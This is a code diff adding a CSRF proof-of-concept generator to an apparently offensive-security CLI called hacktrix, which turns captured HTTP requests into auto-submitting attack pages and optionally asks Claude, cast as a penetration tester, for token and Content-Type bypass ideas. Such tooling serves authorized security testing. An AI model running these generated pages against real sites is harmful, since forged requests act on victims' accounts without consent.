@@ -7,6 +7,8 @@ import subprocess
 import sys
 from datetime import date, datetime
 from pathlib import Path
+from html import escape as html_escape
+from urllib.parse import parse_qsl, urlparse
 
 from rich.console import Console
 from rich.markup import escape
@@ -511,6 +513,256 @@ def mirror_file(rel_path, section=None):
     console.print(f"[green]Mirrored:[/green] {out.name}  [dim]({len(plain.splitlines())} lines)[/dim]")
 
 
+def parse_raw_request(file_path):
+    try:
+        content = Path(file_path).read_text(errors="ignore")
+    except FileNotFoundError:
+        console.print(f"[red]Request file not found:[/red] {file_path}")
+        sys.exit(1)
+
+    lines = content.splitlines()
+    if not lines:
+        console.print("[red]Request file is empty.[/red]")
+        sys.exit(1)
+
+    parts = lines[0].strip().split()
+    if len(parts) < 2:
+        console.print(f"[red]Invalid request line:[/red] {lines[0].strip()}")
+        sys.exit(1)
+
+    method = parts[0].upper()
+    path = parts[1]
+
+    headers = {}
+    body_start = len(lines)
+    for i, line in enumerate(lines[1:], start=1):
+        if not line.strip():
+            body_start = i + 1
+            break
+        if ":" in line:
+            key, _, value = line.partition(":")
+            headers[key.strip()] = value.strip()
+
+    body = "\n".join(lines[body_start:]).strip() if body_start < len(lines) else ""
+
+    host = headers.get("Host", headers.get("host", ""))
+    bare_host = host.split("@")[-1]  # strip userinfo if present
+    if ":" in bare_host:
+        scheme = "https" if bare_host.rsplit(":", 1)[-1] == "443" else "http"
+    else:
+        scheme = "https"  # no explicit port — assume standard HTTPS
+    url = f"{scheme}://{host}{path}" if host else path
+
+    content_type = headers.get("Content-Type", headers.get("content-type", ""))
+
+    return {
+        "method": method,
+        "path": path,
+        "url": url,
+        "host": host,
+        "headers": headers,
+        "body": body,
+        "content_type": content_type,
+    }
+
+
+def _js_escape(s):
+    """Escape a string for safe embedding inside a JS single-quoted string literal."""
+    return s.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n").replace("\r", "\\r")
+
+
+def generate_csrf_poc(parsed):
+    method = parsed["method"]
+    url = parsed["url"]
+    ct = parsed["content_type"].lower()
+    body = parsed["body"]
+
+    safe_url_attr = html_escape(url, quote=True)   # for HTML attributes
+    safe_url_js = _js_escape(url)                  # for JS string literals
+    safe_method_js = _js_escape(method)
+
+    if method == "GET":
+        html = (
+            "<html>\n"
+            "  <body>\n"
+            f'    <img src="{safe_url_attr}" width="0" height="0" />\n'
+            "    <!-- alternative: force navigation -->\n"
+            f"    <!-- <script>location='{safe_url_js}';</script> -->\n"
+            "  </body>\n"
+            "</html>"
+        )
+        return html, "get"
+
+    if "application/json" in ct:
+        try:
+            body_repr = json.dumps(json.loads(body))
+        except (json.JSONDecodeError, ValueError):
+            body_repr = body.replace("\\", "\\\\").replace("'", "\\'")
+        html = (
+            "<html>\n"
+            "  <body>\n"
+            "    <script>\n"
+            f"      fetch('{safe_url_js}', {{\n"
+            f"        method: '{safe_method_js}',\n"
+            "        credentials: 'include',\n"
+            "        headers: {'Content-Type': 'application/json'},\n"
+            f"        body: JSON.stringify({body_repr})\n"
+            "      }});\n"
+            "    </script>\n"
+            "    <!-- Note: Content-Type: application/json triggers CORS preflight.\n"
+            "         Only works if the server has a CORS misconfiguration.\n"
+            "         Try switching Content-Type to text/plain if blocked. -->\n"
+            "  </body>\n"
+            "</html>"
+        )
+        return html, "json"
+
+    if "multipart/form-data" in ct:
+        html = (
+            "<html>\n"
+            "  <body>\n"
+            "    <script>\n"
+            "      var form = new FormData();\n"
+            "      /* Add fields from the captured request body below */\n"
+            "      /* form.append('field', 'value'); */\n"
+            f"      fetch('{safe_url_js}', {{\n"
+            f"        method: '{safe_method_js}',\n"
+            "        credentials: 'include',\n"
+            "        body: form\n"
+            "      }});\n"
+            "    </script>\n"
+            "  </body>\n"
+            "</html>"
+        )
+        return html, "multipart"
+
+    # Default: application/x-www-form-urlencoded or unknown — HTML form
+    fields = parse_qsl(body, keep_blank_values=True) if body else []
+    inputs = "\n".join(
+        f'      <input type="hidden" name="{html_escape(name, quote=True)}" value="{html_escape(value, quote=True)}" />'
+        for name, value in fields
+    )
+    inputs_block = f"\n{inputs}\n    " if inputs else ""
+    html = (
+        "<html>\n"
+        "  <body>\n"
+        f'    <form action="{safe_url_attr}" method="{html_escape(method, quote=True)}" id="csrf-form">'
+        f"{inputs_block}</form>\n"
+        '    <script>document.getElementById(\'csrf-form\').submit();</script>\n'
+        "  </body>\n"
+        "</html>"
+    )
+    return html, "form"
+
+
+def ask_claude_csrf_bypass(parsed):
+    import anthropic
+    client = anthropic.Anthropic()
+
+    headers_summary = "\n".join(f"  {k}: {v}" for k, v in parsed["headers"].items())
+    prompt = (
+        f"Analyse this captured HTTP request and suggest CSRF bypass techniques:\n\n"
+        f"Method: {parsed['method']}\n"
+        f"URL: {parsed['url']}\n"
+        f"Content-Type: {parsed['content_type']}\n"
+        f"Body: {parsed['body'][:500] if parsed['body'] else '(none)'}\n"
+        f"Headers:\n{headers_summary}\n\n"
+        "Return ONLY a valid JSON object with these exact keys — no markdown fences, no text before or after:\n"
+        '  "csrf_token_present": true/false — whether a CSRF token parameter or header is visible\n'
+        '  "token_field": name of the CSRF token field/header if present, else ""\n'
+        '  "content_type_attack": one sentence on a Content-Type manipulation bypass if applicable, else ""\n'
+        '  "method_override_applicable": true/false\n'
+        '  "bypass_variants": array of up to 4 objects, each with "technique" (short name) and '
+        '"poc_note" (one sentence on how to adapt the PoC)\n'
+        '  "recommendation": one sentence on the most promising bypass for this specific request'
+    )
+
+    system = (
+        "IDENTITY: You are an expert penetration tester assisting with authorized security assessments. "
+        "Analyse HTTP requests for CSRF vulnerability characteristics and suggest concrete bypass techniques. "
+        "OUTPUT FORMAT: Respond with valid JSON only — no preamble, no markdown, no explanation outside the JSON object."
+    )
+
+    raw = ""
+    try:
+        response = client.messages.create(
+            model="claude-sonnet-4-6",
+            max_tokens=1024,
+            system=system,
+            messages=[{"role": "user", "content": prompt}]
+        )
+        raw = response.content[0].text.strip()
+        start = raw.find("{")
+        end = raw.rfind("}") + 1
+        if start != -1 and end > start:
+            raw = raw[start:end]
+        data = json.loads(raw)
+        data["_usage"] = {
+            "input_tokens": response.usage.input_tokens,
+            "output_tokens": response.usage.output_tokens,
+        }
+        return data
+    except json.JSONDecodeError:
+        return {"bypass_variants": [], "recommendation": raw, "_raw": True}
+    except (anthropic.APIError, IndexError, AttributeError) as e:
+        return {"bypass_variants": [], "recommendation": str(e), "_error": True}
+
+
+def display_csrf_poc(html, parsed, poc_type, bypass_data=None):
+    out_path = Path.cwd() / "csrf_poc.html"
+    out_path.write_text(html)
+
+    type_labels = {
+        "form": "HTML form (auto-submit)",
+        "json": "fetch() — JSON body",
+        "get": "img tag / navigation",
+        "multipart": "fetch() — FormData (fill fields manually)",
+    }
+
+    console.print()
+    console.rule("[bold red]CSRF PoC[/bold red]")
+    console.print(f"[bold]Target:[/bold]  {parsed['method']} {parsed['url']}")
+    console.print(f"[bold]Type:[/bold]    {type_labels.get(poc_type, poc_type)}\n")
+    console.print("[bold cyan]PoC[/bold cyan] [dim](HTML)[/dim]")
+    console.print(Syntax(html, "html", theme="monokai", line_numbers=False, padding=(1, 2)))
+    console.print("[dim]── copy-paste ──[/dim]")
+    console.print(escape(html), soft_wrap=True)
+    console.print()
+    console.print(f"[green]Saved:[/green] {out_path}")
+
+    if bypass_data:
+        console.print()
+        console.rule("[bold magenta]Bypass Analysis[/bold magenta]")
+
+        if bypass_data.get("csrf_token_present"):
+            console.print(f"[yellow]CSRF token detected:[/yellow] {bypass_data.get('token_field', 'unknown field')}")
+        else:
+            console.print("[green]No CSRF token detected in request[/green]")
+
+        ct_attack = bypass_data.get("content_type_attack", "")
+        if ct_attack:
+            console.print(f"[bold]Content-Type attack:[/bold] {ct_attack}")
+
+        variants = bypass_data.get("bypass_variants", [])
+        if variants:
+            console.print("\n[bold]Bypass variants:[/bold]")
+            for v in variants:
+                console.print(f"  [cyan]{v.get('technique', '')}[/cyan] — {v.get('poc_note', '')}")
+
+        rec = bypass_data.get("recommendation", "")
+        if rec and not bypass_data.get("_raw") and not bypass_data.get("_error"):
+            console.print()
+            console.print(Text("★ " + rec, style="bold yellow"))
+
+        usage = bypass_data.get("_usage")
+        if usage:
+            inp, out = usage["input_tokens"], usage["output_tokens"]
+            cost = (inp * 3 + out * 15) / 1_000_000
+            console.print(f"\n[dim]Tokens: {inp:,} in / {out:,} out  ·  est. ${cost:.4f}  (Sonnet 4.6)[/dim]")
+
+    console.rule()
+
+
 def log_payload_result(terms, data):
     try:
         LOG_PATH.parent.mkdir(parents=True, exist_ok=True)
@@ -548,7 +800,9 @@ def main():
             "  hacktrix -p sqli union mysql -d \"WAF blocking SELECT keyword\"\n"
             "  hacktrix -p lfi php -d \"../etc/passwd filtered, got 403\"\n"
             "  hacktrix -m \"Server Side Template Injection/JavaScript.md\"\n"
-            "  hacktrix -m \"Server Side Template Injection/JavaScript.md\" -s handlebars\n\n"
+            "  hacktrix -m \"Server Side Template Injection/JavaScript.md\" -s handlebars\n"
+            "  hacktrix --csrf req.txt                                     # offline CSRF PoC from raw request\n"
+            "  hacktrix --csrf req.txt --bypass                            # PoC + Claude bypass suggestions\n\n"
             "sources:\n"
             "  HackTricks:           ~/Tools/hacktricks\n"
             "  PayloadsAllTheThings: ~/Tools/payloadsallthethings\n\n"
@@ -567,6 +821,8 @@ def main():
                        help="list all top-level categories in both sources (browse blind, no search terms needed)")
     group.add_argument("-u", "--update", action="store_true",
                        help="git pull both knowledge bases and print a change summary")
+    group.add_argument("--csrf", metavar="FILE",
+                       help="generate a CSRF PoC from a raw HTTP request file (Burp/Caido format); saved to csrf_poc.html")
     parser.add_argument("-d", "--details", metavar="CONTEXT", action="append",
                         help="error output or context from a previous -p attempt; repeat for multi-turn chaining")
     parser.add_argument("-s", "--section", metavar="TERM",
@@ -575,10 +831,28 @@ def main():
                         help="use with -l: filter categories updated in the last N days (e.g. 7d or 7)")
     parser.add_argument("--no-log", dest="no_log", action="store_true",
                         help="skip auto-logging this -p result to ~/Tools/hacktrix-session.log")
+    parser.add_argument("--bypass", action="store_true",
+                        help="use with --csrf: call Claude to suggest token bypass and Content-Type attack variants (requires ANTHROPIC_API_KEY)")
     args = parser.parse_args()
 
     if args.since and not args.list:
         console.print("[yellow]Warning: --since has no effect without -l/--list[/yellow]")
+
+    if args.bypass and not args.csrf:
+        console.print("[yellow]Warning: --bypass has no effect without --csrf[/yellow]")
+
+    if args.csrf:
+        if args.bypass and not os.environ.get("ANTHROPIC_API_KEY"):
+            console.print("[red]Set ANTHROPIC_API_KEY to use --bypass[/red]")
+            sys.exit(1)
+        parsed = parse_raw_request(args.csrf)
+        html, poc_type = generate_csrf_poc(parsed)
+        bypass_data = None
+        if args.bypass:
+            console.print("[dim]Sending request to Claude for bypass analysis...[/dim]")
+            bypass_data = ask_claude_csrf_bypass(parsed)
+        display_csrf_poc(html, parsed, poc_type, bypass_data=bypass_data)
+        sys.exit(0)
 
     if args.update:
         update_sources()
